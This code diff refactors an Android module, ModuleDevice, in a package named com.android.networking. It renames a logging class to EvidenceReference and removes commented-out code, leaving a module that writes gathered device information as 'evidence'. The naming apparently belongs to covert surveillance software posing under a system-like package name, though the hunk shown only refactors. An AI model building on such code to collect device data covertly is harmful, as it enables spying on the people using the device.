@@ -27,7 +27,7 @@ import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.evidence.EvidenceType;
-import com.android.networking.evidence.LogR;
+import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.util.Check;
 import com.android.networking.util.WChar;
 
@@ -152,21 +152,11 @@ public class ModuleDevice extends BaseInstantModule {
 
 		final String content = sb.toString();
 
-		// final int ev = Evidence.convertTypeEvidence(AgentConf.AGENT_DEVICE);
-
-		// atomic log
-		// LogR log = new LogR(EvidenceType.DEVICE, LogR.LOG_PRI_STD, null,
-		// WChar.getBytes(content, true));
-
 		// log
-		final LogR log = new LogR(EvidenceType.DEVICE);
+		final EvidenceReference log = new EvidenceReference(EvidenceType.DEVICE);
 		log.write(WChar.getBytes(content, true));
 		log.close();
 
-		// Evidence
-		// final Evidence evidence = new Evidence(Agent.AGENT_DEVICE);
-		// evidence.atomicWriteOnce(null, EvidenceType.DEVICE,
-		// WChar.getBytes(content, true));
 	}
 
 	/**
